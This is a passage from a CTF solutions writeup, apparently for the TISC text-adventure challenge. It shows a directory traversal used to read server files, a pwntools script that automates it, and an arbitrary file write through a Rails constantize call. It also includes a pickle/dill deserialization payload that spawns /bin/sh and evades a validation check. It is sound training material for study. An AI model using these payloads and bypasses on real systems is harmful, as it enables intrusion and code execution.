# 1865 Text Adventure Solutions

The solutions to the challenge are packaged in a Docker container that handles all of the
dependencies and compilation of custom code. The assumption made as a default is that the challenges
container is run on the same host as the solutions container, and binds the exposed challenge port
to 31337.

This is reflected in the default `config.py`:

```python
#!/usr/bin/env python

import os


# Docker IP pointing to the host.
TARGET_IP = os.getenv('TARGET_IP', '172.17.0.1')
TARGET_PORT = os.getenv('TARGET_PORT', 31337)
```

The value of `172.17.0.1` refers to the [default bridge
network](https://docs.docker.com/network/network-tutorial-standalone/). Either change the default
values, or define the `TARGET_IP` and `TARGET_PORT` environment variables when invoking the scripts
to suit your networking needs.

## Building

To build the container:

```shell
$ make build
```

Note that this can take quite a while as the custom FST ysoserial fork has to compile from scratch.

## Running

To run an interactive `/bin/bash` shell in the container:

```shell
$ make run
```

If a development session is required, the following command will drop you into a `/bin/bash` root
shell with the `solutions` directory mounted so that edits to the files will be reflected in the
container:

```shell
$ make dev
```

When dropped into the shell, check that connectivity to the target server from the solutions
container works.

```shell
root@4f36819a79aa:/opt/wonderland# nc 172.17.0.1 31337
Connected.
Fracture Runtime Environment v0.0.13 -- (c) 2021 -- Steel Worlds Entertainment
Multi-User License: 100-0000-000
Loading assets...
Generating world...
...
```

The executable Python scripts containing the full exploits for each of the stages are:

1. 1_arbitrary_file_read.py
2. 2_insecure_dill_loads.py
3. 3_constantize_send.py
4. 4_a_mad_tea_party.py

They can be executed like so:

```shell
root@4f36819a79aa:/opt/wonderland# ./1_arbitrary_file_read.py
[+] Opening connection to 172.17.0.1 on port 31337: Done
[.\......] Initialising connection. This will take a moment...
[*] Moving to the a-shallow-deadend to get the pocket-watch...
[*] Disabling text scroll.
[*] Moving to a-curious-hall to drink the pink-bottle...
[*] Moving to a-fancy-pavillion to eat the fluffy-cake...
[*] Moving to a-mystical-cove to get the looking-glass...
[*] Triggering path traversal vulnerability to navigate to /
[*] Moving to /home/rabbit
[*] Reading the flag at /home/rabbit/flag1
[+] Flag 1:
[+] TISC{flag1}

[*] Closed connection to 172.17.0.1 port 31337
root@4f36819a79aa:/opt/wonderland#
```

## Full Writeup

This writeup is presented from the point-of-view of the participant and shows how the intended
solution does not require guessing or brute-forcing. It does require a familiarity with a wide
variety of topics, however.

The writeup does not use the supplied optional hints.

### Stage 1: Down the Rabbit Hole

The challenge text for this stage is:

```
Text adventures are fading ghosts of a long time past but this one looks suspiciously brand new.
We want to learn more about the White Rabbit but when we connect to the game, we just keep getting
lost! Can you help us take a look at the secrets in the Rabbit's burrow?

The game is hosted at `172.17.0.1:31337`.
```

#### Background and Initial Experimentation

To begin, connecting to the challenge server gives us a bunch of slow scrolling text adventure-style
output. Finally, it informs us that we have moved to a new location 'bottom-of-a-pit' and lists some
exits.


```shell
root@bf77445f0bce:/opt/wonderland# nc 172.17.0.1 31337
Connected.
Fracture Runtime Environment v0.0.13 -- (c) 2021 -- Steel Worlds Entertainment
Multi-User License: 100-0000-000
Loading assets...
Generating world...
...
BUMP!

You have moved to a new location: 'bottom-of-a-pit'.

You look around and see:
The bottom of a crummy tunnel.

You see exits to the:
  * a-shallow-deadend
  * deeper-into-the-burrow

[bottom-of-a-pit]
```

Typing a random command tells us that the 'help' command exists.

```shell
[bottom-of-a-pit] qwert
Don't know what you mean. Maybe try asking for 'help'.
[bottom-of-a-pit]
```

Using it lists a bunch of available commands.

```shell
[bottom-of-a-pit] help
Available commands: help, look, move, back, read, get, exit
[bottom-of-a-pit]
```

The usages of each of the commands can also be checked using the help command.

```shell
[bottom-of-a-pit] help help
Usage: help [command]
Prints the help documentation for a particular command.
[bottom-of-a-pit] help look
Usage: look
Looks around the room
[bottom-of-a-pit] help move
Usage: move [to room]
Moves to another room
[bottom-of-a-pit] help back
Usage: back
Goes back to the previous room.
[bottom-of-a-pit] help read
Usage: read [note]
Reads a note on the ground.
[bottom-of-a-pit] help get
Usage: read [note]
Reads a note on the ground.
[bottom-of-a-pit] help exit
Usage: exit
Exits from the game.
[bottom-of-a-pit]
```

The 'move' command lets the player move rooms. Moving to `a-shallow-deadend`, we are introduced to
some new objects.

```shell
[bottom-of-a-pit] move a-shallow-deadend
You have moved to a new location: 'a-shallow-deadend'.

You look around and see:
A sandy wall terminates the end of the claustrophobic passage. There is nothing here but a pile of old paper.

There are the following things here:
  * pocket-watch (item)
  * README (note)

[a-shallow-deadend]
```

With some experimentation, we find that we can 'read' notes and 'get' items. The note contains a
little hint as to the direction the player should take to progress.

```shell
[a-shallow-deadend] read README
You read the writing on the note:
Seek out the Looking Glass, little Alice.
It just might help to... open your eyes.

In the meantime, here's something to help with a little... introspection.

- The Cheshire Cat

[a-shallow-deadend] get pocket-watch
You pick up 'pocket-watch'.
The pocket watch glows with a warm waning energy and you feel less muddled in mind.
[a-shallow-deadend]
```

After the `pocket-watch` has been picked up, a new command appears in the 'help' list:

```shell
[a-shallow-deadend] help options
Usage: options [key] [value]
Views and modifies game options.
[a-shallow-deadend]
```

Listing the 'options' gives us the ability to modify the `text_scroll` option to 'false', disabling
the time-wasting scrolling.

```shell
[a-shallow-deadend] options text_scroll false
[a-shallow-deadend] options
The following options are available:
  * text_scroll: False
  * rainbow: False
[a-shallow-deadend]
```

As this room appears to be a terminal node, we have to move backwards a room. This can be done using
the 'back' command.

```shell
[a-shallow-deadend] back
You have moved to a new location: 'bottom-of-a-pit'.

You look around and see:
The bottom of a crummy tunnel.

You see exits to the:
  * a-shallow-deadend
  * deeper-into-the-burrow

[bottom-of-a-pit]
```

Moving from `bottom-of-a-pit` to `deeper-into-the-burrow` to `a-curious-hall`, the player comes upon
a three-way fork.

```shell
[deeper-into-the-burrow] move a-curious-hall
You have moved to a new location: 'a-curious-hall'.

You look around and see:
Breaking through the opening, you find yourself in an odd curious hall. There are three doors here,
in three bright colours: green, blue, and red.

There are the following things here:
  * pink-bottle (item)
  * a-burnt-parchment (note)
  * note-attached-to-bottle (note)

You see exits to the:
  * a-blue-door
  * a-red-door
  * a-green-door

[a-curious-hall]
```

Each of the doors lead to nowhere but the notes in the room give some clues about how to proceed.

```shell
[a-curious-hall] read a-burnt-parchment
You read the writing on the note:
Which of these would you choose, I wonder?

[a-curious-hall] read note-attached-to-bottle
You read the writing on the note:
DRINK ME

[a-curious-hall]
```

Getting the `pink-bottle` causes the player to drink it and shrink such that a tiny pink door is now
accessible.

```shell
[a-curious-hall] get pink-bottle
You pick up 'pink-bottle'.
As you examine the bottle, an overwhelming urge to tip the contents into your mouth overwhelms you. When the pink liquid touches your lips, the croying taste of cakes, and pastries, and pies fills your senses.

However, you realise with horror that the entire world is growing larger...
Or was it you that was growing smaller?
You have moved to a new location: 'a-massive-hall'.

You look around and see:
Now that you are the size of a rat, the three doors from before tower out of your reach. However,
you spot a tiny pink door with a tiny brass door knob, perfect for a tiny human.

You see exits to the:
  * a-pink-door

[a-massive-hall]
```

Following through `a-pink-door` to `maze-entrance` presents a simple maze for the player to explore.

```shell
[a-massive-hall] move a-pink-door
You have moved to a new location: 'a-pink-door'.

You look around and see:
A short hallway leads to the outside.

You see exits to the:
  * maze-entrance

[a-pink-door] move maze-entrance
You have moved to a new location: 'maze-entrance'.

You look around and see:
Nothing but green leaves all around you.

You see exits to the:
  * knotted-boughs
  * a-lush-turn

[maze-entrance]
```

The goal is to reach `a-fancy-pavillion`. With some experimentation, the path to this room is
`knotted-boughs` to `dazzling-pines` to `a-pause-in-the-trees` to `confusing-knot` to
`green-clearing`.

```shell
[green-clearing] move a-fancy-pavillion
You have moved to a new location: 'a-fancy-pavillion'.

You look around and see:
A fancy pavallion sits here, deep in the heart of the maze. At the center of the structure is a
tall gold-rimmed table. Upon the table is a single slice of fluffy cake on a plate made of fine
china.

There are the following things here:
  * fluffy-cake (item)
  * note-attached-to-cake (note)

[a-fancy-pavillion]
```

Reading the note and eating the cake enlarges the character once more and teleports her to yet
another room (`along-the-rolling-waves`), progressing the story.

```shell
[a-fancy-pavillion] read note-attached-to-cake
You read the writing on the note:
EAT ME

[a-fancy-pavillion] get fluffy-cake
You pick up 'fluffy-cake'.
You pick up the nice fluffy slice of cake, and promptly stuff it into your mouth. This time, the world flits away downwards as your neck grows longer and longer, rising high above the trees...
Feeling utterly confused, you begin to cry. Each tear that falls grows bigger and bigger in proportion with your gigantic body...
The tears pool at your feet creating a tiny puddle...
... a medium puddle...
... a large puddle...
... a large lake...
Eventually, the tears form a large sea and you float away in the brine.
You have moved to a new location: 'sea-of-tears'.

You look around and see:
Large salt waves crash all around you. You grab hold onto a piece of driftwood and struggle to stay
afloat.

You see exits to the:
  * along-the-rolling-waves

[sea-of-tears]
```

The next interesting location is `a-mystical-cove`, reachable by moving from `sea-of-tears` to
`along-the-rolling-waves` to `a-sandy-shore`.

```shell
[a-sandy-shore] You have moved to a new location: 'a-mystical-cove'.

You look around and see:
This cave is dark but buzzes with an subtle electricity. A faint wide smile appears to wink at you
from the shadows.

There are the following things here:
  * looking-glass (item)
  * README (note)

[a-mystical-cove]
```

Reading the note and picking up the item gives us a hint that a significant event has happened.

```shell
[a-mystical-cove] read README
You read the writing on the note:
Well done, now the story's just begun.

- Cheshire

[a-mystical-cove] get looking-glass
You pick up 'looking-glass'.
You pick up the looking glass and look through the lens. Through it you see a multitude of infinite worlds, infinite Universes. Suddenly, you feel much more powerful.
[a-mystical-cove]
```

Checking 'help' shows us that the new 'teleport' command was added.

```shell
[a-mystical-cove] help
Available commands: help, look, move, back, read, get, exit, options, teleport
[a-mystical-cove] help teleport
Usage: teleport [location]
Views current location or teleport to another.
[a-mystical-cove]
```

Using the 'teleport' command without any arguments tells us the reference of the current room.

```shell
[a-mystical-cove] teleport
You are currently at:
sea-of-tears/along-the-rolling-waves/a-sandy-shore/a-mystical-cove
[a-mystical-cove]
```

Passing in that reference as an argument to the 'teleport' command brings us to the room.

```shell
[a-mystical-cove] teleport sea-of-tears/along-the-rolling-waves/a-sandy-shore/a-mystical-cove
You have moved to a new location: 'a-mystical-cove'.

You look around and see:
This cave is dark but buzzes with an subtle electricity. A faint wide smile appears to wink at you
from the shadows.

There are the following things here:
  * README (note)

[a-mystical-cove]
```

#### Discovering and Exploiting the Directory Traversal

The presence of '/' characters hint that maybe the rooms are web pages or directories. Attempting
the standard directory traversal payload yields this error message:

```shell
[sea-of-tears] teleport ../../../../../../../
Cannot travel through empty rooms. Pay attention to this!
[sea-of-tears]
```

This error message draws attention to the possibility that the '/' characters are used as delimiters
in splitting the rooms to travel through. So the empty space after the '/' fails the check that a
room must be specified. Modifying the payload slightly allows the attack to succeed, presenting the
filesystem root as an in-game room.

```shell
[a-mystical-cove] teleport ../../../../../..
You have moved to a new location: '..'.

You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
You see exits to the:
  * tmp
  * lib
  * media
  * lib64
  * usr
  * etc
  * sbin
  * home
  * srv
  * opt
  * proc
  * mnt
  * lib32
  * dev
  * run
  * libx32
  * sys
  * root
  * boot
  * var
  * bin
  * snap

[..]
```

If we move to `etc`, we can see that the files are interpreted as notes that we can read.

```shell
[..] move etc
You have moved to a new location: 'etc'.

You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
There are the following things here:
  * subuid (note)
  * ld.so.cache (note)
  * issue.net (note)
  * debconf.conf (note)
...
[etc] read issue
You read the writing on the note:
Ubuntu 20.04.2 LTS \n \l


[etc]
```

If we move to `/home`, we can see that a number of user home directories are listed.

```shell
[..] move home
You have moved to a new location: 'home'.

You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
You see exits to the:
  * mouse
  * rabbit
  * hatter

[home]
```

Attempting to move to the `mouse` and `hatter` directories yield a `PermissionError` message as well
as hint that the Python game code is located `/opt/wonderland/down-the-rabbithole/rabbithole.py`.

```shell
[home] move mouse
You have moved to a new location: 'mouse'.

Traceback (most recent call last):
  File "/opt/wonderland/down-the-rabbithole/rabbithole.py", line 706, in run_game
    self.evaluate(user_line)
  File "/opt/wonderland/down-the-rabbithole/rabbithole.py", line 625, in evaluate
    cmd.run(args)
  File "/opt/wonderland/down-the-rabbithole/rabbithole.py", line 275, in run
    self.game.move_to(args[1])
  File "/opt/wonderland/down-the-rabbithole/rabbithole.py", line 679, in move_to
    self.get_command('look').run(['look'])
  File "/opt/wonderland/down-the-rabbithole/rabbithole.py", line 238, in run
    for ent in self.game.get_invis():
  File "/opt/wonderland/down-the-rabbithole/rabbithole.py", line 659, in get_invis
    return self.get_ents()[2]
  File "/opt/wonderland/down-the-rabbithole/rabbithole.py", line 634, in get_ents
    for ent in self.location.iterdir():
  File "/usr/lib/python3.8/pathlib.py", line 1118, in iterdir
    for name in self._accessor.listdir(self):
PermissionError: [Errno 13] Permission denied: '/opt/wonderland/down-the-rabbithole/stories/../../../../../../home/mouse'

[mouse]
```

However, navigating into `rabbit` works and allow us to list the contents.

```shell
[home] move rabbit
You have moved to a new location: 'rabbit'.

You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
There are the following things here:
  * flag2.bin (note)
  * flag1 (note)

[rabbit]
```

Reading the `flag1` note grants us the first flag.

```shell
[rabbit] read flag1
You read the writing on the note:
TISC{flag1}

[rabbit]
```

Reading the `flag2.bin` file yields binary gibberish instead. However, looking at the present
strings such as `'/home/mouse/flag2'` indicate that it is a binary that has to be executed, possibly
SUID, that reads the flag.

#### Crafting an Exploit

Since the sequence of events is quite long and tedious to enter manually each time the service times
out, there is value in automating interactions with the server. This is also useful as it will be
built upon in the later stages.

This skeleton is implemented in `common.py` as the `Common` class.

First, a `get_connection` factory method is defined to initialise a `Common` object with a pwntools
remote connection object.

```python
class Common:
    '''Class encapsulating common game methods.
    '''

    def __init__(self, p):
        self.p = p

    # Factory

    @staticmethod
    def get_connection(ip=TARGET_IP, port=TARGET_PORT):
        '''Returns a pwntools connection.
        '''
        return Common(remote(ip, port))
```

Next, we define methods to detect where the prompt is to get rid of extraneous data.

```python
    def init_connection(self):
        '''Gets rid of all the starting stuff.
        '''
        log.progress('Initialising connection. This will take a moment...')
        self.get_until_prompt()

    def get_until_prompt(self):
        '''Receives until the prompt is found.
        '''
        self.recvuntil(b'] ')
```

Also, we want to turn in-game actions into an API that we can call programmatically. These functions
correspond to an in-game command and perform the appropriate parsing of the response where
necessary.

```python
    def move(self, location):
        '''Navigates to a particular location.
        '''
        self.sendline(b'move ' + location)
        self.get_until_prompt()

    def get(self, item):
        '''Gets an item from the ground.
        '''
        self.sendline(b'get ' + item)
        self.get_until_prompt()

    def back(self):
        '''Moves back a room.
        '''
        self.sendline(b'back')
        self.get_until_prompt()

    def multimove(self, locations):
        '''Move multiple locations.
        '''
        for location in locations:
            self.move(location)

    def read(self, note):
        '''Reads a note.
        '''
        self.sendline(b'read ' + note)
        self.recvuntil(b'You read the writing on the note:\n')
        data = self.recvuntil(b'[')
        self.get_until_prompt()
        return data[:-1]

    def exit(self):
        '''Quits the game.
        '''
        self.sendline(b'exit')
        self.recvuntil('Goodbye!')
```

Finally, some raw passthrough functions are defined so that they can be interacted with in the same
fashion as the original pwntools connection.

```python
    # Raw Passthroughs

    def sendline(self, data):
        '''Sends some byte data.
        '''
        self.p.sendline(data)

    def recvuntil(self, data):
        '''Receives until some data is met.
        '''
        return self.p.recvuntil(data)

    def interactive(self):
        '''Starts an interactive shell.
        '''
        self.p.interactive()
```

Putting everything together, the following script automates obtaining the `pocket-watch`, disabling
the `text_scroll` option, navigating through the maze of the story, finding the `looking-glass`, and
triggering the directory traversal.

```python
from pwn import *
from common import Common


def main():
    # Get the connection.
    c = Common.get_connection()
    c.init_connection()

    # Move to the a-shallow-deadend to get the pocket-watch.
    # This pocket-watch allows us to turn off text scrolling.
    log.info('Moving to the a-shallow-deadend to get the pocket-watch...')
    c.move(b'a-shallow-deadend')
    c.get(b'pocket-watch')
    log.info('Disabling text scroll.')
    c.sendline(b'options text_scroll f')
    c.back()

    # Move to the a-curious-hall and drink the pink-bottle.
    log.info('Moving to a-curious-hall to drink the pink-bottle...')
    next_path = [b'deeper-into-the-burrow', b'a-curious-hall', b'a-curious-hall']
    c.multimove(next_path)
    c.get(b'pink-bottle')

    # Move to the a-fancy-pavillion and eat the fluffy-cake.
    log.info('Moving to a-fancy-pavillion to eat the fluffy-cake...')
    next_path = [b'a-pink-door', b'maze-entrance', b'knotted-boughs', b'dazzling-pines',
                 b'a-pause-in-the-trees', b'confusing-knot', b'green-clearing',
                 b'a-fancy-pavillion']
    c.multimove(next_path)
    c.get(b'fluffy-cake')

    # Move to a-mystical-cove to get the looking-glass.
    log.info('Moving to a-mystical-cove to get the looking-glass...')
    next_path = [b'along-the-rolling-waves', b'a-sandy-shore', b'a-mystical-cove', ]
    c.multimove(next_path)
    c.get(b'looking-glass')

    # Trigger the path traversal to get to the root.
    log.info('Triggering path traversal vulnerability to navigate to /')
    c.sendline('teleport ../../../../../../..')

    # Move to /home/rabbit/
    log.info('Moving to /home/rabbit')
    next_path = [b'home', b'rabbit']
    c.multimove(next_path)

    # Get the flag.
    log.info('Reading the flag at /home/rabbit/flag1')
    flag1 = c.read(b'flag1')
    log.success('Flag 1:')
    log.success(flag1.decode('ascii'))

    # Present an interactive prompt.
    c.interactive()
```

Running the exploit:

```shell
root@6c1aa90244ec:/opt/wonderland# ./1_arbitrary_file_read.py
[+] Opening connection to 172.17.0.1 on port 31337: Done
[...\....] Initialising connection. This will take a moment...
[*] Moving to the a-shallow-deadend to get the pocket-watch...
[*] Disabling text scroll.
[*] Moving to a-curious-hall to drink the pink-bottle...
[*] Moving to a-fancy-pavillion to eat the fluffy-cake...
[*] Moving to a-mystical-cove to get the looking-glass...
[*] Triggering path traversal vulnerability to navigate to /
[*] Moving to /home/rabbit
[*] Reading the flag at /home/rabbit/flag1
[+] Flag 1:
[+] TISC{flag1}

[*] Switching to interactive mode
$
```

The full exploit can be found in `1_arbitrary_file_read.py`.


### Stage 2: Pool of Tears

The challenge text for this stage is:

```
It looks like the Rabbit has been misbehaving. Within his cache of secrets lies a special device
that does not belong to him. However, our attempts read it yield gibberish. It appears to require...
activation. To activate it, we must first become Rabbit.

Please assume the identity of the Rabbit.

The game is hosted at `172.17.0.1:31337`.
```

#### Understanding the System

Since the `flag2.bin` contents look a lot like an ELF file, and the challenge text seems to request
that we assume the identity of the Rabbit, it can be inferred that we need to obtain a shell.

To proceed, we should understand the game using the newfound arbitrary read capability. First, we
can teleport to the `/opt/wonderland/down-the-rabbithole/` directory.

```shell
$ teleport ../../../../../../opt/wonderland/down-the-rabbithole
You have moved to a new location: 'down-the-rabbithole'.

You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
There are the following things here:
  * requirements.txt (note)
  * generate_items.py (note)
  * rabbithole.py (note)
  * rabbit_conf.py (note)

You see exits to the:
  * stories
  * __pycache__
  * art

[down-the-rabbithole] $
```

This lets us read some important files such as `generate_items.py` and `rabbithole.py`. The
interesting snippet from the former includes this Golden Hookah item. It also tells us where the
item is located.

```python
# Golden Hookah - at under-a-giant-mushroom
# Grants the player the ability to blow smoke into words.

def golden_hookah_on_get(self):
    '''Grants the blow smoke command.
    '''
    ...
    self.game.commands.append(BlowSmokeCommand(self.game))
    self.game.teleport(STORY_BASE / 'vast-emptiness')

def setup_golden_hookah():
    item = make_item('golden-hookah', golden_hookah_on_get)
    path = (STORY_BASE / 'sea-of-tears/along-the-rolling-waves/a-sandy-shore/into-the-woods/'
            'further-into-the-woods/nearing-a-clearing/clearing-of-flowers/under-a-giant-mushroom/'
            'golden-hookah.item')
    write_object(path, item)
```

This item grants the ability to 'blow smoke'. The `BlowSmokeCommand` object is defined in
`rabbithole.py`. It makes a HTTP request to the POOL_OF_TEARS.

```python
POOL_OF_TEARS = "http://localhost:4000/api/v1/smoke"
...
class BlowSmokeCommand(Command):
    '''Blows smoke to leave a mark on the world.
    '''

    def __init__(self, game):
        super().__init__(game)

    def run(self, args):
        if len(args) < 3:
            # Print location.
            letterwise_print("What do you wish to say?")
            return

        letterwise_print('Smoke bellows from the lips of {} to form the words, "{}."'.format(
            args[1], ' '.join(args[2:])))
        letterwise_print('Curling and curling...')
        uniqid = "{}-{}".format(self.game.location.name, clean_identifiers(args[1]))
        content = ' '.join(args[2:]).replace(' ', '%20').replace('&','')
        url = "{}?cargs[]=wb&uniqid={}&content={}".format(POOL_OF_TEARS, uniqid, content)
        response = urlopen(url)
        response_contents = response.read()
        if response_contents == b'OK':
            letterwise_print('The words float up high into the air and eventually disappate.')
        else:
            letterwise_print('The words harden into pasty rocks and drop to the ground.')
            letterwise_print('They spell:')
            letterwise_print(response_contents)

    def help(self):
        hstr = (
            'Usage: blowsmoke [your name] [your message]\n'
            'Leave your mark on the universe.'
        )
        return ('blowsmoke', hstr)

    def key(self, arg):
        return 'blowsmoke' ==  arg
```

The command constructs requests of the form:

`http://localhost:4000/api/v1/smoke?cargs[]=wb&uniqid=XXXX-YYYY&content=ZZZZ`

Where:

    * XXXX - The location name
    * YYYY - The user specified name
    * ZZZZ - The user specified message

Since this is a web service, URL encoded values can be passed allowing for non-alphanumeric
characters to be passed.

We can teleport to the location containing the `golden-hookah` to retrieve the item.

```shell
$ teleport sea-of-tears/along-the-rolling-waves/a-sandy-shore/into-the-woods/further-into-the-woods/nearing-a-clearing/clearing-of-flowers/under-a-giant-mushroom
You have moved to a new location: 'under-a-giant-mushroom'.

You look around and see:
The most massive mushroom you have ever seen looms over you. A large crumpled skin-like pile lies on
the ground nearby. It appears to be the (corpse?) of an enormous caterpillar.

There are the following things here:
  * golden-hookah (item)

[under-a-giant-mushroom] $ get golden-hookah
You pick up 'golden-hookah'.
Placing the mouthpiece of the hookah to your lips, a rush of rainbow smoke bellows suddenly into your lungs without even inhaling.
The smoke glows brightly as you try to get it out.
It floats heavily and lazily arranges itself into the words:


▄▄▌ ▐ ▄▌ ▄ .▄           ▄▄▄· • ▌ ▄ ·.     ▪
██· █▌▐███▪▐█▪         ▐█ ▀█ ·██ ▐███▪    ██
██▪▐█▐▐▌██▀▐█ ▄█▀▄     ▄█▀▀█ ▐█ ▌▐▌▐█·    ▐█·
▐█▌██▐█▌██▌▐▀▐█▌.▐▌    ▐█ ▪▐▌██ ██▌▐█▌    ▐█▌
 ▀▀▀▀ ▀▪▀▀▀ · ▀█▄▀▪     ▀  ▀ ▀▀  █▪▀▀▀    ▀▀▀


You have moved to a new location: 'vast-emptiness'.

You look around and see:
Once the smoke clears, you find yourself in the middle of a great nothingness. You drift, floating
in non-space.

There are the following things here:
  * README (note)

You see exits to the:
  * eternal-desolation

[vast-emptiness] $
```

This gives us a new 'blowsmoke' command.

```shell
[vast-emptiness] $ help
Available commands: help, look, move, back, read, get, exit, options, teleport, blowsmoke
[vast-emptiness] $ help blowsmoke
Usage: blowsmoke [your name] [your message]
Leave your mark on the universe.
[vast-emptiness] $
```

Running the command does not really reveal much.

```shell
[vast-emptiness] $ blowsmoke amon something cool
Smoke bellows from the lips of amon to form the words, "something cool."
Curling and curling...
The words float up high into the air and eventually disappate.
[vast-emptiness] $
```

Exploring the `/opt/wonderland` directory will give us more clues as what the 'POOL_OF_TEARS' is.
Teleporting there shows us that there is a corresponding directory.

```shell
[vast-emptiness] $ teleport ../../../../../../opt/wonderland
You have moved to a new location: 'wonderland'.

You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
You see exits to the:
  * pool-of-tears
  * logs
  * a-mad-tea-party
  * down-the-rabbithole
  * utils

[wonderland] $
```

#### Discovering the Arbitrary Write Primitive

If we list it, it becomes apparent that the application is a Ruby on Rails service.

```shell
[wonderland] $ move pool-of-tears
You have moved to a new location: 'pool-of-tears'.

You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
There are the following things here:
  * Rakefile (note)
  * Gemfile.lock (note)
  * config.ru (note)
  * run.sh (note)
  * README.md (note)
  * Gemfile (note)

You see exits to the:
  * tmp
  * lib
  * config
  * test
  * db
  * public
  * vendor
  * app
  * storage
  * log
  * bin

[pool-of-tears] $
```

We can read the `config/routes.rb` file to get a look at what routes are supported by the
application and their associated controller.

```ruby
[config] $ read routes.rb
You read the writing on the note:
Rails.application.routes.draw do
  root 'welcome#index'

  get "/api/v1/smoke", to: "smoke#remember"
  # For details on the DSL available within this file, see https://guides.rubyonrails.org/routing.html
end

[config] $
```

This controller is located at `app/controllers/smoke_controller.rb`.

```ruby
[controllers] $ read smoke_controller.rb
You read the writing on the note:
class SmokeController < ApplicationController

  skip_parameter_encoding :remember

  def remember
    # Log down messages from our happy players!

    begin
      ctype = "File"
      if params.has_key? :ctype
        # Support for future appending type.
        ctype = params[:ctype]
      end

      cargs = []
      if params.has_key?(:cargs) && params[:cargs].kind_of?(Array)
        cargs = params[:cargs]
      end

      cop = "new"
      if params.has_key?(:cop)
        cop = params[:cop]
      end

      if params.has_key?(:uniqid) && params.has_key?(:content)
        # Leave the kind messages
        fn = Rails.application.config.message_dir + params[:uniqid]
        cargs.unshift(fn)
        c = ctype.constantize
        k = c.public_send(cop, *cargs)
        if k.kind_of?(File)
          k.write(params[:content])
          k.close()
        else
          # Implement more types when we need distributed logging.
          render :plain => "Type is not implemented yet."
          return
        end

      else
        render :plain => "ERROR"
        return
      end
    rescue => e
      render :plain => "ERROR: " + e.to_s
      return
    end

    render :plain => "OK"
  end
end

[controllers] $
```

The value of `Rails.application.config.message_dir` can be gleaned from `config/application.rb`:

```ruby
    config.message_dir = "/opt/wonderland/logs/"
```

Since the earlier `rabbithole.py` example request looks like the following:

```
http://localhost:4000/api/v1/smoke?cargs[]=wb&uniqid=XXXX-YYYY&content=ZZZZ
```

The values the variables should look like this at the end of the function:

* `ctype = "File"`
* `cargs = ["XXXX-YYYY", "wb"]`
* `cop = "new"`
* `c = File`
* `k = <open file with wb flags>`

The Ruby code `File.new("/opt/wonderland/logs/XXXX-YYYY", "wb")` is evaluated. The content of `ZZZZ`
is also written to the newly opened file since it is of type `File`.

Since the values of `YYYY` (the name) and `ZZZZ` (the message) are controlled by the player with the
`BlowSmokeCommand`, this can be used to write arbitrary data to a file whose suffix is player
specified.

#### Discovering the Insecure Dill Deserialization

Going back to the `generate_items.py` script, we can see that the items are written to the story
tree locations with the following code:

```python
# Utilities

def write_object(location, obj):
    '''Writes an object to the specified location.
    '''
    with open(location, 'wb') as f:
        dill.dump(obj, f, recurse=True)


def make_item(key, on_get):
    '''Makes a new item dynamically.
    '''
    item = Item(key)
    item.on_get = types.MethodType(on_get, item)
    return item
```

This means that the items are dill-serialized. Dill is an extension of the standard Python pickle
that supports the pickling of typically unpickleable types and is also vulnerable to Pickle
deserialization payloads.

The un-dilling happens in the `GetCommand` of `rabbithole.py`:

```python
class GetCommand(Command):
    '''Gets an item from the ground in the current room.
    '''

    def __init__(self, game):
        super().__init__(game)

    ...

    def run(self, args):
        if len(args) < 2:
            letterwise_print("You don't see that here.")
            return
        for i in self.game.get_items():
            if (args[1] + '.item') == i.name and args[1] not in self.game.inventory:
                got_something = True
                # Check that the item must be serialized with dill.
                item_data = open(i, 'rb').read()
                if not self.validate_stream(item_data):
                    letterwise_print('Seems like that item may be an illusion.')
                    return
                item = dill.loads(item_data)
                letterwise_print("You pick up '{}'.".format(item.key))
                self.game.inventory[item.key] = item
                item.prepare(self.game)
                item.on_get()
                return

        letterwise_print("You don't see that here.")

    def help(self):
        hstr = (
            'Usage: read [note]\n'
            'Reads a note on the ground.'
        )
        return ('get', hstr)

    def key(self, arg):
        return 'get' ==  arg
```

One thing to note is that the file must have the suffix of `'.item'`. The interesting portion in the
`run` code is that it runs a function called `validate_stream` on the item data before allowing the
call to `dill.loads`. This turns out to be a function that disassembles the data using `pickletools`
and checks that the presence of a number of strings is in the data. This is a very easily bypassable
rudimentary check intended to check if the output is generated with dill. It will defeat the
standard Python pickle payloads found [on the
web](https://davidhamann.de/2020/04/05/exploiting-python-pickle/).

```python
    def validate_stream(self, data):
        '''Validates that the byte stream contains suitable dill serialized content.
        '''
        tests = {
            'rabbithole': False,
            'dill._dill': False,
            'on_get': False,
        }
        try:
            ops = pickletools.genops(data)
            for op, arg, pos in ops:
                if op.name == 'SHORT_BINUNICODE' and arg in tests:
                    tests[arg] = True
            for _, v in tests.items():
                if not v:
                    return False
            return True
        except:
            var = traceback.format_exc()
            pprint(var)
            return False
```

However, it is not difficult to ensure the presence of these strings. The serialized `Exploit` class
can be modified to the following.

```python
class Exploit:
    '''Spawns a /bin/bash shell when deserialized.

    Includes some required strings that are checked server-side to determine 'dill-ness'.
    '''

    def __reduce__(self):
        cmd = ('/bin/sh')
        return os.system, (cmd,), {'a': 'dill._dill', 'b': 'rabbithole', 'c': 'on_get'}
```

Alternatively, an actual `Item` class, including an arbitrarily defined `on_get` function, could be
serialized using the `generate_items.py` helpers so that the arbitrary code execution happens when
the `on_get` hook is run. The bypass above is the simpler approach.

#### Crafting an Exploit

To validate the observations so far, let's travel to `/opt/wonderland/logs` and attempt to blow some
smoke.

```shell
[vast-emptiness] $ teleport ../../logs
You have moved to a new location: 'logs'.

You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
[logs] $ blowsmoke amon.item HELLOWORLD
Smoke bellows from the lips of amon.item to form the words, "HELLOWORLD."
Curling and curling...
The words float up high into the air and eventually disappate.
[logs] $ look
You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
There are the following things here:
  * logs-amon (item)

[logs] $
```

A file called `logs-amon.item` was created. Attempting to get the item prints an error as expected:

```shell
[logs] $ get logs-amon
Traceback (most recent call last):
  File "/opt/wonderland/down-the-rabbithole/rabbithole.py", line 363, in validate_stream
    for op, arg, pos in ops:
  File "/usr/lib/python3.8/pickletools.py", line 2285, in _genops
    raise ValueError("at position %s, opcode %r unknown" % (
ValueError: at position 0, opcode b'H' unknown

Seems like that item may be an illusion.
[logs] $
```

To confirm that URL encoded messages work:

```shell
